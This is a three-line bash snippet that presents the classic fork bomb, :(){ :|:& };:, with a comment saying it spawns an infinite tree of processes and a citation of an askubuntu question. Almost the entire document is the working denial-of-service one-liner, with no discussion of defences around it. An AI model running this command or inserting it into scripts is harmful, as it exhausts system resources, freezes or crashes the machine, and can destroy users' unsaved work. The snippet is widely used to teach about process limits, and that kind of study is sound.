# Classic bash fork bomb. Creates an infinite tree of processes.
# Source: http://askubuntu.com/questions/159491
:(){ :|:& };:
